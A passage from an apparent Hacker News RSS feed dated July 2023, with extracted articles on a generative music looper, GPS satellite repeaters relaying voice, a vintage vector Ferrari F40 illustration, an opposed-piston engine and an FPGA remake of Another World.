<p>While Microsoft’s disclosures have been less than forthcoming in the role its vulnerabilities played in breaching the accounts of organizations, Friday’s disclosure provides helpful indicators that people can use to determine if they’ve been targeted or compromised by Storm-0558.</p>

                                                </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Every time you click this link, it will send you to a random Web 1.0 website (1080 pts)]]></title>
            <link>https://wiby.me/surprise/</link>
            <guid>36739920</guid>
            <pubDate>Sat, 15 Jul 2023 19:03:16 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://wiby.me/surprise/">https://wiby.me/surprise/</a>, See on <a href="https://news.ycombinator.com/item?id=36739920">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[Chuck E. Cheese's 1982 Annual Report For Kids [pdf] (182 pts)]]></title>
            <link>https://www.showbizpizza.com/info/documents/ptt/ptt_annualreport1982kids.pdf</link>
            <guid>36739906</guid>
            <pubDate>Sat, 15 Jul 2023 19:01:53 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.showbizpizza.com/info/documents/ptt/ptt_annualreport1982kids.pdf">https://www.showbizpizza.com/info/documents/ptt/ptt_annualreport1982kids.pdf</a>, See on <a href="https://news.ycombinator.com/item?id=36739906">Hacker News</a></p>
&lt;Not HTML&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[Unloop: A generative music looper that doesn’t repeat itself (133 pts)]]></title>
            <link>https://github.com/hugofloresgarcia/unloop</link>
            <guid>36739688</guid>
            <pubDate>Sat, 15 Jul 2023 18:35:31 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/hugofloresgarcia/unloop">https://github.com/hugofloresgarcia/unloop</a>, See on <a href="https://news.ycombinator.com/item?id=36739688">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-target="readme-toc.content">
            <article itemprop="text"><h2 tabindex="-1" dir="auto">unloop</h2>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/hugofloresgarcia/unloop/blob/main/assets/fullUI.png"><img src="https://github.com/hugofloresgarcia/unloop/raw/main/assets/fullUI.png" width="60%"></a></p>
<p dir="auto">unloop is a co-creative looper that uses generative modeling to <strong>not</strong> repeat itself.</p>
<p dir="auto">watch a demo video here: <a href="https://youtu.be/yzBI8Vcjd2s" rel="nofollow">https://youtu.be/yzBI8Vcjd2s</a>.</p>
<p dir="auto">unlooper leverages the power of <a href="https://hugo-does-things.notion.site/VampNet-Music-Generation-via-Masked-Acoustic-Token-Modeling-e37aabd0d5f1493aa42c5711d0764b33" rel="nofollow">VampNet</a>, a masked generative model for music, to generate variations of loop a musician has recorded, creating a more interactive and fun experience than using a traditional looper.</p>
<h2 tabindex="-1" dir="auto">Setup</h2>
<p dir="auto">unloop is a Max patch, but it requires python to contact the <a href="https://huggingface.co/spaces/descript/vampnet" rel="nofollow">huggingface space</a> that hosts the VampNet model to generate the variations.</p>
<p dir="auto">you will need to install the following max externals s well: <a href="https://github.com/rconstanzo/karma/tree/master">karma</a> and <a href="https://github.com/jeremybernstein/shell">shell</a>.</p>
<p dir="auto">First, clone the repo</p>
<div dir="auto" data-snippet-clipboard-copy-content="git clone https://github.com/hugofloresgarcia/unloop.git
cd unloop"><pre>git clone https://github.com/hugofloresgarcia/unloop.git
<span>cd</span> unloop</pre></div>
<p dir="auto"><code>unloop</code> requires Python 3 to be installed on your computer.</p>
<p dir="auto">Then, install the local python package called <code>vamp</code>.</p>
<div dir="auto" data-snippet-clipboard-copy-content="python -m pip install -e ."><pre>python -m pip install -e <span>.</span></pre></div>
<p dir="auto">You'll need to keep track of where your python installation is, so copy the output of the following command:</p>

<p dir="auto">Your python path will look like this: <code>/some/path/to/bin/python</code>.</p>
<h2 tabindex="-1" dir="auto">Usage</h2>
<p dir="auto"><code>unloop</code> is a Max patch, meaning that you'll need to open it using <a href="https://cycling74.com/downloads" rel="nofollow">Max MSP</a>.</p>
<p dir="auto">to open <code>unloop</code>, simply open <code>unloop.maxpat</code> using Max.</p>
<p dir="auto"><strong>NOTE</strong>: you'll need to know the path to the Python installation where you installed the <code>vamp</code> package. You'll need to enter this path in the max patch.</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/hugofloresgarcia/unloop/blob/main/assets/pythoninstall.png"><img src="https://github.com/hugofloresgarcia/unloop/raw/main/assets/pythoninstall.png" alt="python-path"></a></p>
<p dir="auto">Once you've done this, you're all set! Refer to the demo video for a <a href="https://youtu.be/yzBI8Vcjd2s" rel="nofollow">usage example</a>.</p>
</article>
          </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Receiving unintentional voice transmissions from GPS satellites (176 pts)]]></title>
            <link>https://www.rtl-sdr.com/receiving-unintentional-voice-transmissions-from-gps-satellites/</link>
            <guid>36739320</guid>
            <pubDate>Sat, 15 Jul 2023 17:49:12 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.rtl-sdr.com/receiving-unintentional-voice-transmissions-from-gps-satellites/">https://www.rtl-sdr.com/receiving-unintentional-voice-transmissions-from-gps-satellites/</a>, See on <a href="https://news.ycombinator.com/item?id=36739320">Hacker News</a></p>
<div id="readability-page-1" class="page"><section id="site" role="main">
<article id="post-58164">
<header>
<time datetime="2023-07-07T05:35:38+00:00" pubdate="">July 7, 2023</time>

</header>
<div>
<p>Over on dereksgc’s YouTube channel we’ve discovered a few more recent interesting videos from his satellite decoding series that people may be interested in. One from two weeks ago shows how it’s possible to receive voice transmissions on navigation satellites such as GPS.</p>
<p>Many navigational and meteorological satellites carry a search and rescue (SAR) repeater which is intended to receive UHF emergency locator beacons and rebroadcast them in the L-band or higher. However the repeaters appear to be picking up all sorts of other signals from the ground, including voice transmissions. Dereksgc notes that the theory is that there are some land based communications systems in some countries that are sharing frequencies that emergency locator beacons use, or that malicious pirates may be actively using these SAR repeaters for their own communications.</p>
<p>Dereksgc shows examples of retransmitted signals on the Beidou, GLONASS and Elektro-L satellite downlinks at 1.5442 GHz and at 2.226 MHz for the GPS satellites. He also shows what sort of satellite dish and feed setup you need. In the video he uses a HackRF as the SDR, but you could also use an RTL-SDR for the satellites that transmit at 1.5442 GHz.</p>
<div id="WYL_U_pCHTeamn8" data-src="https://www.rtl-sdr.com/wp-content/plugins/wp-youtube-lyte/lyteCache.php?origThumbUrl=https%3A%2F%2Fi.ytimg.com%2Fvi%2FU_pCHTeamn8%2Fmaxresdefault.jpg" title="Receiving voice transmissions from GPS satellites || Satellite reception pt.10"><p>Receiving voice transmissions from GPS satellites || Satellite reception pt.10</p></div>

</div>


</article>







</section></div>]]></description>
        </item>
        <item>
            <title><![CDATA[“The Famous F40” Vector Illustration (147 pts)]]></title>
            <link>https://blog.gingerbeardman.com/2023/07/15/the-famous-f40-vector-illustration/</link>
            <guid>36739283</guid>
            <pubDate>Sat, 15 Jul 2023 17:45:05 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.gingerbeardman.com/2023/07/15/the-famous-f40-vector-illustration/">https://blog.gingerbeardman.com/2023/07/15/the-famous-f40-vector-illustration/</a>, See on <a href="https://news.ycombinator.com/item?id=36739283">Hacker News</a></p>
<div id="readability-page-1" class="page"><div itemprop="articleBody">
          

          

          

          <p>I was looking through some old <em>Macintosh</em> CD-ROMs, searching for my usual things that I do whenever I add new discs to my collection: hanafuda, specific artists, favourite software, plugins for said favourite software, and so on. Whilst I was deep in the filesystem I stumbled across some old sample files from <em>Deneba <em>Canvas</em></em> and noticed how they were all credited to the artist.</p>

<p><img src="https://blog.gingerbeardman.com/images/posts/deneba-canvas-david-rumfelt.png" alt="Canvas Title was produced entirely in <em>Canvas</em> 2.1 by <em>David Rumfelt</em>, <em>Deneba Software</em>. © 1990 <em>Deneba Systems</em>, Inc." title="Canvas Title was produced entirely in <em>Canvas</em> 2.1 by <em>David Rumfelt</em>, <em>Deneba Software</em>. © 1990 <em>Deneba Systems</em>, Inc." loading="lazy"></p>

<p>Intrigue got the better of me so I did a quick google and came up with <a href="https://www.canvasgfx.com/blog/driven-by-design-david-rumfelt-graphic-artist">a post on the <em>Canvas</em> GFX website</a> (yes, the software still exists!) about <em>David Rumfelt</em> and his most famous work: a cutaway illustration of a Ferrari F40.</p>

<blockquote>
  <p>Thanks to my <a href="https://www.patreon.com/gingerbeardman">Patreon</a> supporters for their help and encouragement with this type of content.</p>
</blockquote>

<p>Going back to the <a href="https://archive.org/details/GRAVIS_CD_1_94">files on the CD</a>, I found the artwork for <em>The Famous F40</em>! It was alongside another detailed cutaway piece called <em>The Famous Harley</em>. In the folder containing the artwork files there was an important looking <em>Read Me</em> document:</p>

<blockquote>
  <p>Effectively immediately, all uses of the F-40 and Harley image by Deneba or third-party vendors MUST include one of the following tag lines in the credits: <strong>“Original art by <em>David Kimble</em>. Electronically re-created in <em>Canvas</em> by <em>Deneba Software</em>”</strong> or <strong>“Original art by <em>David Kimble</em>. Electronically re-created in <em>Canvas</em> by <em>Deneba Software</em> artist <em>Dave Rumfelt</em>.”</strong></p>
</blockquote>

<p>These days we would just call it a vector illustration, but at the time I guess there must have been some fun discussions as to both the legality of this piece of work—a copy of a piece of art originally created by somebody else—and also how it should be described to minimise <a href="https://www.canvasgfx.com/blog/driven-by-design-david-rumfelt-graphic-artist">the outrage David describes</a> when he recalls creating the piece.</p>

<figure>
<picture>
  <source srcset="https://cdn.gingerbeardman.com/images/posts/deneba-canvas-david-rumfelt-the-famous-f40-exported.avif 1x, https://cdn.gingerbeardman.com/images/posts/deneba-canvas-david-rumfelt-the-famous-f40-exported-retina.avif 2x" type="image/avif">
  <source srcset="https://cdn.gingerbeardman.com/images/posts/deneba-canvas-david-rumfelt-the-famous-f40-exported.webp 1x, https://cdn.gingerbeardman.com/images/posts/deneba-canvas-david-rumfelt-the-famous-f40-exported-retina.webp 2x" type="image/webp">
  <img src="https://cdn.gingerbeardman.com/images/posts/deneba-canvas-david-rumfelt-the-famous-f40-exported.png" srcset="https://cdn.gingerbeardman.com/images/posts/deneba-canvas-david-rumfelt-the-famous-f40-exported-retina.png 2x" onload="doScroll();" alt="" title="" loading="lazy">
</picture>
<figcaption>Original art by <em>David Kimble</em>. Electronically re-created in <em>Canvas</em> by <em>Deneba Software</em> artist <em>Dave Rumfelt</em>.</figcaption></figure>

<h2 id="time-travel">Time travel</h2>

<p>The F40 is a mind blowing piece of work and is reported to feature around 28,000 vector objects. It’s a very good imitation of the <a href="https://uk.motor1.com/news/462763/ferrari-f40-straight-piped-autobahn/">original illustration</a> by the legendary <a href="https://memory-alpha.fandom.com/wiki/David_A._Kimble">David Kimble</a> on which it is based.</p>

<p>I recorded a short video showing me zooming, scrolling, and watching it redraw. Finally I ungroup everything a handful of times to count the total number of vector objects. This is running in an emulator of a <em>Macintosh</em> with <em>System 7.5</em> and 64MB RAM, though the illustration only requires around 8MB RAM. Maybe this will transport you back through time to when you were young!?</p>

<iframe width="740" height="555" src="https://www.youtube.com/embed/5HMUp6vmc4Q" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="" loading="lazy"></iframe>

<p>Back in the late 1980s and early 1990s <em>Canvas</em>—and most other contemporary illustration software—did not draw lines smoothly using the process known as <a href="https://en.wikipedia.org/wiki/Spatial_anti-aliasing">anti-aliasing</a>. This was for a combination of performance reasons (you need the artwork to redraw quickly) and hardware limitations (computers didn’t have GPU acceleration and displays often ran with limited colours). The resulting image has lines with aliasing—a distinct pixel stepping—and gradient fills that are not very smooth. Though I feel that a lot of the gradient fills in this piece are deliberately using banding for similar technical reasons.</p>

<p>After playing around in <em>Canvas</em> for a while, I decided to see if I could get a higher quality version of the file. Rather than struggle making 30-year-old software do something it would rather not, I exported the <em>Canvas</em> file as an <em>EPS</em> and moved to modern macOS. Importing it into modern <em>Photoshop</em> allowed me to export a higher quality, smooth, anti-aliased version of the illustration that you see at the top of this page. But why stop there?</p>



<p>You can scroll around this image or right click and open it in a new tab to see it in all its glory.</p>




<h2 id="notes">Notes</h2>

<p>Eagle-eyed viewers may notice that this version of the F40 differs slightly from <a href="https://www.canvasgfx.com/blog/driven-by-design-david-rumfelt-graphic-artist">the one shown on the <em>Canvas</em> GFX web page</a>. The <em>Canvas</em> file I have from 1994 is some missing elements, such as the metalwork between the petrol cap and petrol tank. It is also comprised of around 16,000 vector objects, around two thirds of the reported number. Also of note is the image on the <em>Canvas</em> GFX website appears to be either squished horizontally or stretched vertically.</p>

<h2 id="further-reading">Further reading</h2>

<ul>
  <li><a href="https://uk.motor1.com/news/462763/ferrari-f40-straight-piped-autobahn/">Gallery: Ferrari F40 Prototype cutaway sketch by <em>David Kimble</em></a></li>
  <li><a href="https://motors.mega.mu/news/6-ferrari-f40-facts-car-nerds-only-20170303.html">Some Ferrari F40 facts for car nerds only</a></li>
</ul>

<h2 id="downloads">Downloads</h2>

<ul>
  <li>
<a href="https://cdn.gingerbeardman.com/files/deneba-canvas-david-rumfelt-the-famous-f40.pdf">The Famous F40, <em>PDF</em> file</a> (2MB, direct download)</li>
  <li>
<a href="https://cdn.gingerbeardman.com/files/deneba-canvas-david-rumfelt-the-famous-f40.sit">The Famous F40, <em>Canvas</em> file as SIT</a> (10MB, direct download)</li>
  <li>
<a href="https://archive.org/details/GRAVIS_CD_1_94">The Famous F40, <em>Canvas</em> file on CD-ROM</a> (400MB, link to download page)</li>
</ul>

        </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Company builds 500cc ‘one-stroke’ engine (126 pts)]]></title>
            <link>https://www.thedrive.com/news/company-builds-powerful-500cc-one-stroke-engine-immediately-installs-it-in-a-miata</link>
            <guid>36738597</guid>
            <pubDate>Sat, 15 Jul 2023 16:42:56 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.thedrive.com/news/company-builds-powerful-500cc-one-stroke-engine-immediately-installs-it-in-a-miata">https://www.thedrive.com/news/company-builds-powerful-500cc-one-stroke-engine-immediately-installs-it-in-a-miata</a>, See on <a href="https://news.ycombinator.com/item?id=36738597">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-id="page-content" data-og-area="article-blocks" id="incArticle"><p>I love weird engines—give me a <a href="https://www.thedrive.com/news/heres-why-the-fabled-12-rotor-wont-work-yet" target="_blank" rel="noreferrer noopener">rotary</a>, a <a href="https://www.thedrive.com/news/33909/the-turbine-truck-wars-inside-ford-and-chevys-jet-age-battle-for-a-better-semi-truck" target="_blank" rel="noreferrer noopener">turbine</a>, or, hell, <a href="https://www.thedrive.com/news/37592/here-are-12-of-the-wildest-porsche-concepts-youve-never-seen-until-now" target="_blank" rel="noreferrer noopener">even a flat-eight</a> and I'll be happy. That's why I was so excited when I heard that INNengine of Granada, Spain had produced a opposed-piston engine that packed a pretty powerful punch in an extremely tiny package.</p><p>There's no cylinder head in this motor. Also no crankshaft, no camshaft, and no valves. That's why it's no surprise that this engine tips the scales at just 85 pounds. Somehow, it still produces 120 horsepower with just half a liter of displacement, thanks to what the company calls a single-stroke combustion cycle. Perfect to throw into a Miata, <a href="https://youtu.be/-evhsWLWlkY" target="_blank" rel="noreferrer noopener">as it turns out</a>.</p><div data-og-block-area="article-blocks" data-og-block-nth="1" data-og-block-type="core/embed"><p itemprop="associatedMedia"><iframe frameborder="0" src="https://www.youtube.com/embed/-evhsWLWlkY?feature=oembed&amp;rel=0&amp;enablejsapi=1" allowfullscreen=""></iframe></p></div><p>Despite having four cylinder banks, the INNengine (depending on its configuration) actually has eight pistons. This is because the engine is an opposed-piston motor, meaning that each piston's compression stroke is performed against a second piston placed in the same cylinder bank rather than a static cylinder head. It still only has four combustion chambers, though, which means it sounds similar to a four-cylinder engine. </p><p>There are no connecting rods to be seen in this motor (at least not in a traditional sense). Instead, the pistons sit on rollers that ride against a lobed circular plate which can be adjusted to affect the engine's timing and compression ratio. As the lobe reaches its peak, the piston rushes towards top-dead-center where fuel is directly injected into the cylinder and a spark plug ignites the compressed air-fuel mixture.</p><figure data-og-block-area="article-blocks" data-og-block-nth="1" data-og-block-type="core/image"><span data-rawhtml="1"><em>INN Engine</em> </span></figure><p>The mechanical configuration also allows for better engine balance. That means typical drawbacks of an internal combustion motor (often referred to as noise, vibration, and harshness) are minimalized.</p><p>Once combustion happens, the piston is pushed back against the plate and forces the plate to rotate. This motion is synced between each half of the motor via a shared shaft—meaning, no extra timing components. Both pistons in the same cylinder bank mimic one another's movements <em>almost</em> exactly.</p><p>When the pistons reach the bottom of their strokes, a respective intake and exhaust port is uncovered. One piston is timed to reach bottom-dead-center slightly prior to the other, this allows the exhaust gasses to escape out of the exhaust port and create a vacuum inside of the cylinder—this technique is called <a href="https://www.thedrive.com/news/38901/how-this-10-3-liter-one-cylinder-tractor-runs-at-zero-rpm" target="_blank" rel="noreferrer noopener">scavenging</a>. Fresh air is then pulled in via the intake port as the combustion byproduct is expelled. This effectively gives the pistons double duty, performing the work normally handled by valves in a typical combustion engine—which means that the common drawback of direct injection, carbon-laced valves, is a thing of the past.</p><div data-og-block-area="article-blocks" data-og-block-nth="2" data-og-block-type="core/embed"><p itemprop="associatedMedia"><iframe frameborder="0" src="https://www.youtube.com/embed/9I0_3qFmPUM?feature=oembed&amp;rel=0&amp;enablejsapi=1" allowfullscreen=""></iframe></p></div><p>Power is also output at both ends of the motor, meaning that a gearbox could be connected to either (or both) end of the motor to put the power to a vehicle's wheels.</p><p>Now, here's the thing: this motor <em>isn't</em> a one-stroke engine. It has a compression stroke and exhaust stroke, making it a two-stroke cycle. INNengine acknowledges this and has said that it brands the motor as such because people would assume that a two-stroke engine would need to have oil mixed in along with fuel. Most two-strokes do. The company says that the one-stroke name was suggested by an "external ICE institution" and they found it to be "catchy," so INNengine stuck with it.</p><figure data-og-block-area="article-blocks" data-og-block-nth="2" data-og-block-type="core/image"><span data-rawhtml="1"><em>INN Engine</em> </span></figure><p>Is it likely that we'll see INNengine's combustion tech powering the wheels of a car? Probably not, at least not directly hooked up to a gearbox. The Mazda featured in INNengine's demo video was a great concept, but the company seems to be instead targeting the EV market as a range extender, <a href="https://www.thedrive.com/news/evs-are-piling-up-on-dealer-lots-as-supply-outpaces-demand" target="_blank" rel="noreferrer noopener">especially since that's the way the industry is ultimately headed</a>.</p><p>If the tech had debuted a few decades ago or more, perhaps there would have been a chance of adoption in the main market (<a href="https://www.thedrive.com/cars-101/38493/rotary-engine" target="_blank" rel="noreferrer noopener">cue Felix Wankel's notorious rotary</a>). But messing with perfection in this day and age, especially as combustion tech could be on the way out, seems a bit unlikely to take off. That's why a range extender would appear to be the most logical path forward for this tech, especially if we want more <a href="https://www.thedrive.com/features/toyota-is-right-we-need-more-hybrid-cars-and-fewer-evs-heres-why" target="_blank" rel="noreferrer noopener">lightweight, cost-effective EVs</a>.</p><h2 data-og-block-area="article-blocks" data-og-block-nth="1" data-og-block-type="core/heading" data-rawhtml="1" id="more_weird_engine_stories_from_the_drive">More Weird Engine Stories From The Drive</h2><p><em>Got a tip or question for the author? Contact them directly: rob@thedrive.com</em></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Another World ported to FPGA (283 pts)]]></title>
            <link>https://github.com/sylefeb/a5k</link>
            <guid>36738347</guid>
            <pubDate>Sat, 15 Jul 2023 16:23:52 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/sylefeb/a5k">https://github.com/sylefeb/a5k</a>, See on <a href="https://news.ycombinator.com/item?id=36738347">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-target="readme-toc.content">
            <article itemprop="text"><h2 tabindex="-1" dir="auto">a5k: How I remade Another World / Out of This World in hardware on the UP5K FPGA</h2>
<blockquote>
<p dir="auto">Just want to test?</p>
<p dir="auto"><strong>Simulation:</strong> Checkout the repo, install <a href="https://github.com/sylefeb/Silice/GetStarted.md">Silice</a>
put the <a href="#wheres-all-the-data">game data</a> in <code>GAMEDATA</code>
and from a command line type in <code>make simul1</code> (no need for an actual FPGA,
this will run the intro in simulation).</p>
<p dir="auto"><strong>Hardware:</strong> Current supported boards are the icebreaker + VGA PMOD, mch2022 badge and ULX3S over HDMI. Pre-built bitstreams are included but the <a href="#wheres-all-the-data">game data</a> is needed in <code>GAMEDATA</code> so the data packs can be prepared. <a href="#wheres-all-the-data">Jump here</a> if you'd like to test on hardware first.</p>
</blockquote>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/sylefeb/a5k/blob/main/docs/teaser1.jpg"><img width="256" src="https://github.com/sylefeb/a5k/raw/main/docs/teaser1.jpg"></a>&nbsp;&nbsp;<a target="_blank" rel="noopener noreferrer" href="https://github.com/sylefeb/a5k/blob/main/docs/teaser2.jpg"><img width="256" src="https://github.com/sylefeb/a5k/raw/main/docs/teaser2.jpg"></a></p>
<h2 tabindex="-1" dir="auto">Foreword</h2>
<p dir="auto">This project is my personal homage to Another World.
This game is not only a graphical and gameplay masterpiece, it is also a technical
marvel: The entire game runs on a beautifully designed Virtual Machine (VM) that
calls only a blitter and rasterizer to produce the graphics in four framebuffers!
(<a href="#lexic">what's a vm, blitter or rasterizer anyway?</a>)</p>
<p dir="auto">The VM is quite minimalistic, and both the blitter and <a href="https://twitter.com/sylefeb/status/1361072515641188356" rel="nofollow">rasterizer</a> are good
candidates for hardware designs. Therefore it was very tempting to create
a hardware implementation of the entire framework : no standard CPU, a truly
native hardware version of the Another World VM, blitter and rasterizer. While
I'll keep referring to the "VM" in the following, keep it mind it will become an
actual custom processor, implementing on an FPGA all of Another World opcodes in
hardware. This is not a 6502, not a Z80, not a 68000: this is <strong>an Out-Of-This-World-chip!</strong></p>
<p dir="auto">As I started to explore hardware remakes of various game render loops (e.g. <a href="https://twitter.com/sylefeb/status/1254711510812602368" rel="nofollow">Wolfenstein3D</a>, <a href="https://github.com/sylefeb/Silice/tree/master/projects/terrain/README.md">Comanche</a>, <a href="https://twitter.com/sylefeb/status/1258808333265514497" rel="nofollow">Doom</a>, <a href="https://twitter.com/sylefeb/status/1564758778830065666" rel="nofollow">Quake</a>),
the idea of doing a hardware version of Another World was very tempting.
What really made it click is when I realized, reading <a href="https://fabiensanglard.net/another_world_polygons/" rel="nofollow">@fabynou excellent blog</a>,
that the four framebuffers were 4-bits 320x200. That meant 128KB of data in total
which precisely fits the Lattice UP5K SPRAM! This was too good to pass on!</p>
<blockquote>
<p dir="auto">SPRAM is a special fast memory embedded within the FPGA, more on this later.</p>
</blockquote>
<p dir="auto">The entire design revolves around four major components:</p>
<ul dir="auto">
<li>The VM that becomes an actual processor implemented in hardware,</li>
<li>The (hardware) blitter that copies data between framebuffers,</li>
<li>The (hardware) rasterizer that draws polygons in framebuffers,</li>
<li>The SOC that glues everything together, adding the display refresh.</li>
</ul>
<p dir="auto">The UP5K Lattice FPGA runs comfortably at 25 MHz. This makes it easy to meet
game performance requirements (recall the original was running on 7-8 MHz machines).
The challenge is more in terms of fitting memory and FPGA resource requirements.
Indeed, an FPGA is a grid of <a href="https://github.com/sylefeb/Silice/blob/master/learn-silice/README.md#fpga-hardware-design-101">programmable logic cells with programmable
interconnect</a>.
There is a fixed number of cells, and even though a design could theoretically
work in simulation it might not fit a given FPGA. The 'logic' - think of it as
the code - has to fit within a budget. This budget is often expressed in number
of 'LUT's which are the small programmable units of the FPGA fabric (LUT stands
for Lookup Up Table, this is a <a href="https://github.com/sylefeb/Silixel">simple yet powerful concept</a> behind FPGAs).</p>
<p dir="auto">To give you an idea, 1K LUTs lets you do a fairly capable dual core RISC-V 32 bits CPU and 5K LUTs (plus some DSPs) a <a href="https://www.youtube.com/watch?v=3ZBAZ5QoCAk" rel="nofollow">SOC that can run Doom</a> and a <a href="https://github.com/sylefeb/tinygpus/">CPU+GPU capable of perspective correct 3D rendering</a> (Comanche, Doom, Quake). Thus it seemed 5K LUTs ought to be enough for Another World.</p>
<blockquote>
<p dir="auto">Overall it really feels the design wanted to fit 5K LUTs, this is more or less where it ended without too much optimization effort. But it could, for sure, be a lot smaller.</p>
</blockquote>
<p dir="auto">However the framebuffers really are the 'hot piece'. They need to be accessed
quickly for both display (screen refresh) and rendering (raster/blitter).
It just happens that the UP5K features 128KB of SPRAM memory, a memory that can
be accessed (read or write) in 1 cycle. And it features a write mask to write the
memory by groups of 4-bits (nibbles), exactly matching a 4bpp palette.
This makes it a perfect candidate.</p>
<p dir="auto">So, let's get started!</p>
<blockquote>
<p dir="auto">If you'd rather skip the details and just want to run the design,
<a href="#wheres-all-the-data">jump here</a>.</p>
</blockquote>
<h2 tabindex="-1" dir="auto">The making of</h2>
<blockquote>
<p dir="auto">While I do not assume any prior knowledge in the following, let me recommend
Fabien Sanglard excellent <a href="https://fabiensanglard.net/another_world_polygons/index.html" rel="nofollow">blog series on Another World</a> before we get started. His posts give an in-depth overview of the
engine. A lot here is based on <a href="https://github.com/fabiensanglard/Another-World-Bytecode-Interpreter">Fabien's fork</a> of the C++ port by Gregory Montoir.</p>
</blockquote>
<h3 tabindex="-1" dir="auto">Getting started</h3>
<p dir="auto">So how did I get started on this all? At first, the task of doing a remake can be intimidating. But as always I started from the data. Before
anything you have to understand the data, how it is loaded, how large it is, how it flows through the code at runtime and how you can load it into your own version. This was <em>greatly</em> facilitated by
the <a href="https://github.com/fabiensanglard/Another-World-Bytecode-Interpreter">C++ port</a>.</p>
<p dir="auto">My first task was to check whether there were any dynamic loading of data during the game execution. A favorable scenario is to have a single data pack comfortably stored in ROM -- in our case the SPI-memory (see note below) -- and avoid any sort of runtime dynamic allocation. Because we won't have <em>malloc</em> or any sort of such luxury here :-D.
By the way, <em>data</em> here means both the instructions for the VM, the graphics and sound. The graphics are (<em>almost</em>) entirely polygons, stored in a specific way that makes the rasterizer simpler. More on this later.</p>
<blockquote>
<p dir="auto">We are targeting FPGAs, and most boards typically feature a <em>SPI-flash</em> memory.
This is a relatively large memory (e.g. 16 MB) that is slow to write to but quite
fast to read from (think 10-20 cycles for random access). So from the design point of view it acts as a ROM. It also
retains its content when powered off.</p>
</blockquote>
<p dir="auto">To track the data I started to dive into the C++ port. The VM is easily identified as <code>vm.cpp</code>, which essentially contains one method per operand plus the global orchestration of game threads (only one is active at a time, there is no true parallelism within the VM).
From the code, we can see that there are 256 VM variables (<code>VirtualMachine::vmVariables</code>) as well as 64 records for threads
(each record is 64 bits : two 16 bits data fields in <code>threadsData</code>, one 16 bits call stack pointer in <code>_scriptStackCalls</code> and two 8 bits active fields in <code>vmIsChannelActive</code>).
This is already great news, as this means the entire VM state could fit into BRAMs -- another special type of memory distributed across the FPGA fabric that answers to read/write requests in just one cycle. So think of these variables and thread records as VM internal registers: it means the hardware 'VM' has 256 registers and 64 threads.</p>
<blockquote>
<p dir="auto">BRAM, contrary to SPRAM, can be initialized at power up. There are also variants allowing multiple read/write ports, we'll come back to this later. There is however not a lot of BRAM on FPGAs, the UP5K provides 120 Kbits.</p>
</blockquote>
<p dir="auto">Back to tracking game data. One operand stands out as being for data manipulation: <code>VirtualMachine::op_updateMemList</code>. Looking at the code, a <code>resourceId</code> is given as operand and loaded by <code>Resource::loadPartsOrMemoryEntry</code> (from <code>resource.cpp</code>).
So this is where I started, adding "printf's" (the C++ port as a nice logging system that I used) and working my way down the chain. Beyond <code>Resource::loadPartsOrMemoryEntry</code> this led me to  <code>Resource::loadMarkedAsNeeded</code> where actual loading occurs from the game resource management system -- exactly the type of runtime system I'd like to bypass :)</p>
<p dir="auto">Looking at the logs confirmed that after an initial loading stage, the op code was no longer called until the end of a long section of the game. In addition, we can see in <code>Engine::init</code> (from <code>engine.cpp</code>) that single game sections -- or <em>parts</em> -- can be launched independently calling <code>VirtualMachine::initForPart</code>. For instance, the famous intro section is the second part (the first is the protection screen). Selecting various parts confirmed that loading indeed occurs only at the beginning of each of these sections.</p>
<p dir="auto">This gave me hope that each game part could be stored into a single, separate game package loaded once at the start of the part.
To try this I instrumented the calls to <code>op_updateMemList</code> such that a data pack would be dumped after each call, the idea being that the full pack for the part is dumped on the last call. The start address is <code>Resource::_memPtrStart</code>, after which loaded data is copied by calls to <code>Resource::loadMarkedAsNeeded</code>. The end address is <code>Resource::_scriptCurPtr</code> which advances each time a resource is loaded from <code>Resource::loadMarkedAsNeeded</code>.</p>
<p dir="auto">After obtaining a first data pack, I commented out the content of <code>op_updateMemList</code> and loaded the pack once at the start of the game part, in <code>Resource::setupPart</code>. It worked!</p>
<blockquote>
<p dir="auto">To create the data packs the <code>Makefile</code> compiles and runs my fork of the C++ port, which outputs the data package of a part.</p>
</blockquote>
<blockquote>
<p dir="auto">A data pack contains different sections of data, and their start offset is different for each game part. For now, these offsets are baked into the hardware design, which means we have one design for each game part. Not ideal. I did experiment with loading the offsets from the ROM (code is commented) but this incurs a relatively significant increase in LUTs. Quite sure this can be improved!</p>
</blockquote>
<h2 tabindex="-1" dir="auto">Time for a 'hardware VM'</h2>
<p dir="auto">Once the data pack obtained, I created a first minimalist SOC with SPI-memory and a skeleton of the VM. The overall execution pattern of the VM is to fetch the next instruction operator (a byte)  from memory at the program counter <code>pc</code> address, select what to do, load the necessary operands from memory and act upon it. The number and size of operands varies between operators. Many operators only modify the VM state (registers, threads and <code>pc</code>) while others have side effects such as drawing polygons or using the blitter to transfer data between framebuffers.</p>
<p dir="auto">SPI-memory is such that there is a latency to start reading from an address, but once started the data is streamed in every cycle (<a href="https://github.com/sylefeb/Silice/blob/wip/projects/spiflash/README.md">Quad SPI at 2x the clock</a>). So to avoid a slow byte per byte reading and to amortize latency, I start by fetching some sufficient number of bytes (64) into a small BRAM cache, getting both the operator and all operands that might be required.</p>
<p dir="auto">The overall process of fetching instructions is enclosed into an outer loop that deals with threads. For this I simply reproduced the logic from <code>vm.cpp</code>, adjusting for the use of BRAMs instead of arrays.</p>
